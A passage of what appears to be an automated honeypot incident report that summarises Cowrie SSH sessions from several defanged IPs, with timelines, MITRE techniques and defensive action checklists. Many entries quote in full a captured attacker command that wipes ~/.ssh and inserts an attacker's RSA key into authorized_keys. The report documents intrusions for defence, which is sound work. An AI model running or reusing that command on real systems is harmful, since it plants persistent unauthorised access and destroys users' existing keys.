| `2026-04-09 03:04:25` | `cowrie.command.failed` |
| `2026-04-09 03:04:25` | `cowrie.log.closed` |
| `2026-04-09 03:04:26` | `cowrie.session.params` |
| `2026-04-09 03:04:26` | `cowrie.command.input` |
| `2026-04-09 03:04:26` | `cowrie.session.file_download` |
| `2026-04-09 03:04:26` | `cowrie.log.closed` |
| `2026-04-09 03:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbb14b5045bd

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 03:04 |
| **Last Seen** | 2026-04-09 03:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 03:04:28` | `cowrie.session.connect` |
| `2026-04-09 03:04:28` | `cowrie.client.version` |
| `2026-04-09 03:04:28` | `cowrie.client.kex` |
| `2026-04-09 03:04:29` | `cowrie.login.success` |
| `2026-04-09 03:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ca2801b8de8

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 03:06 |
| **Last Seen** | 2026-04-09 03:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 03:06:13` | `cowrie.session.connect` |
| `2026-04-09 03:06:13` | `cowrie.client.version` |
| `2026-04-09 03:06:13` | `cowrie.client.kex` |
| `2026-04-09 03:06:14` | `cowrie.login.success` |
| `2026-04-09 03:06:14` | `cowrie.session.params` |
| `2026-04-09 03:06:14` | `cowrie.command.input` |
| `2026-04-09 03:06:14` | `cowrie.command.failed` |
| `2026-04-09 03:06:14` | `cowrie.log.closed` |
| `2026-04-09 03:06:15` | `cowrie.session.params` |
| `2026-04-09 03:06:15` | `cowrie.command.input` |
| `2026-04-09 03:06:15` | `cowrie.session.file_download` |
| `2026-04-09 03:06:15` | `cowrie.log.closed` |
| `2026-04-09 03:06:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d82b0a76207f

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 03:06 |
| **Last Seen** | 2026-04-09 03:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 03:06:17` | `cowrie.session.connect` |
| `2026-04-09 03:06:17` | `cowrie.client.version` |
| `2026-04-09 03:06:17` | `cowrie.client.kex` |
| `2026-04-09 03:06:18` | `cowrie.login.success` |
| `2026-04-09 03:06:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-776799444c68

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 03:09 |
| **Last Seen** | 2026-04-09 03:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 03:09:43` | `cowrie.session.connect` |
| `2026-04-09 03:09:43` | `cowrie.client.version` |
| `2026-04-09 03:09:43` | `cowrie.client.kex` |
| `2026-04-09 03:09:44` | `cowrie.login.success` |
| `2026-04-09 03:09:44` | `cowrie.session.params` |
| `2026-04-09 03:09:44` | `cowrie.command.input` |
| `2026-04-09 03:09:44` | `cowrie.command.failed` |
| `2026-04-09 03:09:44` | `cowrie.log.closed` |
| `2026-04-09 03:09:44` | `cowrie.session.params` |
| `2026-04-09 03:09:44` | `cowrie.command.input` |
| `2026-04-09 03:09:44` | `cowrie.session.file_download` |
| `2026-04-09 03:09:44` | `cowrie.log.closed` |
| `2026-04-09 03:09:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b76e41369b3e

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 03:09 |
| **Last Seen** | 2026-04-09 03:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 03:09:47` | `cowrie.session.connect` |
| `2026-04-09 03:09:47` | `cowrie.client.version` |
| `2026-04-09 03:09:47` | `cowrie.client.kex` |
| `2026-04-09 03:09:47` | `cowrie.login.success` |
| `2026-04-09 03:09:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c786d3684054

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 03:11 |
| **Last Seen** | 2026-04-09 03:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 03:11:29` | `cowrie.session.connect` |
| `2026-04-09 03:11:29` | `cowrie.client.version` |
| `2026-04-09 03:11:29` | `cowrie.client.kex` |
| `2026-04-09 03:11:30` | `cowrie.login.success` |
| `2026-04-09 03:11:30` | `cowrie.session.params` |
| `2026-04-09 03:11:30` | `cowrie.command.input` |
| `2026-04-09 03:11:30` | `cowrie.command.failed` |
| `2026-04-09 03:11:30` | `cowrie.log.closed` |
| `2026-04-09 03:11:31` | `cowrie.session.params` |
| `2026-04-09 03:11:31` | `cowrie.command.input` |
| `2026-04-09 03:11:31` | `cowrie.session.file_download` |
| `2026-04-09 03:11:31` | `cowrie.log.closed` |
| `2026-04-09 03:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52f96940bda1

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 03:11 |
| **Last Seen** | 2026-04-09 03:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 03:11:33` | `cowrie.session.connect` |
| `2026-04-09 03:11:33` | `cowrie.client.version` |
| `2026-04-09 03:11:33` | `cowrie.client.kex` |
| `2026-04-09 03:11:34` | `cowrie.login.success` |
| `2026-04-09 03:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b02963b05e6d

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 03:16 |
| **Last Seen** | 2026-04-09 03:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 03:16:37` | `cowrie.session.connect` |
| `2026-04-09 03:16:37` | `cowrie.client.version` |
| `2026-04-09 03:16:38` | `cowrie.client.kex` |
| `2026-04-09 03:16:38` | `cowrie.login.success` |
| `2026-04-09 03:16:38` | `cowrie.session.params` |
| `2026-04-09 03:16:38` | `cowrie.command.input` |
| `2026-04-09 03:16:38` | `cowrie.command.failed` |
| `2026-04-09 03:16:39` | `cowrie.log.closed` |
| `2026-04-09 03:16:39` | `cowrie.session.params` |
| `2026-04-09 03:16:39` | `cowrie.command.input` |
| `2026-04-09 03:16:39` | `cowrie.session.file_download` |
| `2026-04-09 03:16:39` | `cowrie.log.closed` |
| `2026-04-09 03:16:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8c3a3beabfc

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 03:16 |
| **Last Seen** | 2026-04-09 03:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 03:16:41` | `cowrie.session.connect` |
| `2026-04-09 03:16:41` | `cowrie.client.version` |
| `2026-04-09 03:16:41` | `cowrie.client.kex` |
| `2026-04-09 03:16:42` | `cowrie.login.success` |
| `2026-04-09 03:16:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d36c75cf51b0

| Field | Detail |
|---|---|
| **Source IP** | `95.231.249[.]182` |
| **First Seen** | 2026-04-09 04:10 |
| **Last Seen** | 2026-04-09 04:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:10:25` | `cowrie.session.connect` |
| `2026-04-09 04:10:25` | `cowrie.client.version` |
| `2026-04-09 04:10:25` | `cowrie.client.kex` |
| `2026-04-09 04:10:25` | `cowrie.login.success` |
| `2026-04-09 04:10:26` | `cowrie.session.params` |
| `2026-04-09 04:10:26` | `cowrie.command.input` |
| `2026-04-09 04:10:26` | `cowrie.command.failed` |
| `2026-04-09 04:10:26` | `cowrie.log.closed` |
| `2026-04-09 04:10:26` | `cowrie.session.params` |
| `2026-04-09 04:10:26` | `cowrie.command.input` |
| `2026-04-09 04:10:26` | `cowrie.session.file_download` |
| `2026-04-09 04:10:26` | `cowrie.log.closed` |
| `2026-04-09 04:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.231.249[.]182` to AbuseIPDB if not already reported
- [ ] Block `95.231.249[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d5e9c308cb5

| Field | Detail |
|---|---|
| **Source IP** | `95.231.249[.]182` |
| **First Seen** | 2026-04-09 04:10 |
| **Last Seen** | 2026-04-09 04:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:10:29` | `cowrie.session.connect` |
| `2026-04-09 04:10:29` | `cowrie.client.version` |
| `2026-04-09 04:10:29` | `cowrie.client.kex` |
| `2026-04-09 04:10:29` | `cowrie.login.success` |
| `2026-04-09 04:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.231.249[.]182` to AbuseIPDB if not already reported
- [ ] Block `95.231.249[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22c66ee432a0

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:19 |
| **Last Seen** | 2026-04-09 04:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:19:38` | `cowrie.session.connect` |
| `2026-04-09 04:19:38` | `cowrie.client.version` |
| `2026-04-09 04:19:38` | `cowrie.client.kex` |
| `2026-04-09 04:19:38` | `cowrie.login.success` |
| `2026-04-09 04:19:39` | `cowrie.session.params` |
| `2026-04-09 04:19:39` | `cowrie.command.input` |
| `2026-04-09 04:19:39` | `cowrie.command.failed` |
| `2026-04-09 04:19:39` | `cowrie.log.closed` |
| `2026-04-09 04:19:39` | `cowrie.session.params` |
| `2026-04-09 04:19:39` | `cowrie.command.input` |
| `2026-04-09 04:19:40` | `cowrie.session.file_download` |
| `2026-04-09 04:19:40` | `cowrie.log.closed` |
| `2026-04-09 04:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3911fe758ece

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:19 |
| **Last Seen** | 2026-04-09 04:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:19:42` | `cowrie.session.connect` |
| `2026-04-09 04:19:42` | `cowrie.client.version` |
| `2026-04-09 04:19:42` | `cowrie.client.kex` |
| `2026-04-09 04:19:43` | `cowrie.login.success` |
| `2026-04-09 04:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f30b992696a

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:21 |
| **Last Seen** | 2026-04-09 04:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:21:09` | `cowrie.session.connect` |
| `2026-04-09 04:21:09` | `cowrie.client.version` |
| `2026-04-09 04:21:09` | `cowrie.client.kex` |
| `2026-04-09 04:21:10` | `cowrie.login.success` |
| `2026-04-09 04:21:10` | `cowrie.session.params` |
| `2026-04-09 04:21:10` | `cowrie.command.input` |
| `2026-04-09 04:21:10` | `cowrie.command.failed` |
| `2026-04-09 04:21:10` | `cowrie.log.closed` |
| `2026-04-09 04:21:11` | `cowrie.session.params` |
| `2026-04-09 04:21:11` | `cowrie.command.input` |
| `2026-04-09 04:21:11` | `cowrie.session.file_download` |
| `2026-04-09 04:21:11` | `cowrie.log.closed` |
| `2026-04-09 04:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-417e27bc44a3

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:21 |
| **Last Seen** | 2026-04-09 04:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:21:13` | `cowrie.session.connect` |
| `2026-04-09 04:21:13` | `cowrie.client.version` |
| `2026-04-09 04:21:13` | `cowrie.client.kex` |
| `2026-04-09 04:21:14` | `cowrie.login.success` |
| `2026-04-09 04:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db550a98491e

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:24 |
| **Last Seen** | 2026-04-09 04:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:24:02` | `cowrie.session.connect` |
| `2026-04-09 04:24:02` | `cowrie.client.version` |
| `2026-04-09 04:24:02` | `cowrie.client.kex` |
| `2026-04-09 04:24:03` | `cowrie.login.success` |
| `2026-04-09 04:24:03` | `cowrie.session.params` |
| `2026-04-09 04:24:03` | `cowrie.command.input` |
| `2026-04-09 04:24:03` | `cowrie.command.failed` |
| `2026-04-09 04:24:04` | `cowrie.log.closed` |
| `2026-04-09 04:24:04` | `cowrie.session.params` |
| `2026-04-09 04:24:04` | `cowrie.command.input` |
| `2026-04-09 04:24:04` | `cowrie.session.file_download` |
| `2026-04-09 04:24:04` | `cowrie.log.closed` |
| `2026-04-09 04:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b453212d0bd

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:24 |
| **Last Seen** | 2026-04-09 04:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:24:07` | `cowrie.session.connect` |
| `2026-04-09 04:24:07` | `cowrie.client.version` |
| `2026-04-09 04:24:07` | `cowrie.client.kex` |
| `2026-04-09 04:24:08` | `cowrie.login.success` |
| `2026-04-09 04:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ac58c4c7760

| Field | Detail |
